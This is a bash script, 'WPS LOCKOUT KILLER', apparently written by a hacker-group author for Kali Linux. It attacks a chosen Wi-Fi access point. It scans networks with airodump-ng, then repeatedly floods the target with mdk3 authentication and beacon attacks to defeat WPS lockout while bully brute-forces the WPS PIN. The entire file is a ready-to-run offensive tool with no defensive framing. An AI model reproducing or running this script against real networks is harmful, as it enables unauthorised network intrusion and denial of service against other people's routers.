#!/bin/bash
#Hackshoteam 
#LOCKEOUT KILLER
#BETA VERSION
#TESTED :KALI

menu ()  {

clear 

echo "   ############## Welcome To WPS LOCKOUT KILLER V1 ###########";
echo "   ###########################################################";
echo "   ##            Full Information                           ##";
echo "   ##   Author   :      { Fantome195 }                      ##";
echo "   ##   Country  :      { Morocco   }                       ##";
echo "   ##   Email    :      { hacker.fantome195@gmail.com }     ##";
echo "   ##   Website  :      { http://hackshowblog.com }         ##";
echo "   ###########################################################";
 
echo " 1: Scan Networks  \c"
echo " 2: Attack Networks  \c"
echo " 3: Clean & Quit \c"
echo "\n\n         Your Choice : \c"
read choice 


case $choice in 

1)scan;;
2)attack;;
3)cleaner;;
esac

 
}


scan () {


echo "\n Please enter your interface name (ex:wlan0 )  : \c" 
read interface ;

monitors

echo "\n Please Make sure you copy Your Target's BSSID & ESSID & channel  \n";

echo " This  Will Be  Killed After 30 seconds \n"; 

gnome-terminal -e "timeout 40s airodump-ng mon0 ";
 sleep 20s
menu
}

attack () {

read -p " Please enter The ESSID  : " essid ; 
read -p " Please enter The BSSID  : " bssid ; 
read -p " Please enter The channel  : " channel ;

while true 

do 

rm /tmp/cracklog.txt >> /dev/null ; 



xterm  -e "timeout 2m mdk3 mon1 a -t "$bssid" -e "$essid"  -s 5000 " &

xterm  -e "timeout 2m mdk3 mon2 a -t "$bssid" -e "$essid"  -s 5000 " &

xterm  -e "timeout 2m mdk3 mon3 b -t "$bssid" -e "$essid" -s 5000" & 

xterm  -e "timeout 2m mdk3 mon4 b -t "$bssid" -e "$essid" -s 5000" &

bully -b "$bssid" -A -C -D -F -c $channel  mon0 >> /tmp/cracklog.txt &

tail -f /tmp/cracklog.txt &2>1;
          if 
                tail -f /tmp/cracklog.txt | grep -q Timeout
         then
                killall bully
		killall xterm

                killall tail
        fi

sleep 7m


done
}

cleaner () { i="1";

while [ $i -lt 15 ]; 

do

airmon-ng stop mon$i >> /dev/null

i=$((i+1)) 
done }



monitors ()  {
echo "\n [+] Starting Monitors ....."

airmon-ng start $interface >> /dev/null

airmon-ng start $interface >> /dev/null

airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
airmon-ng start $interface >> /dev/null
echo "\n [+] Oky Done .  \n";

}













menu
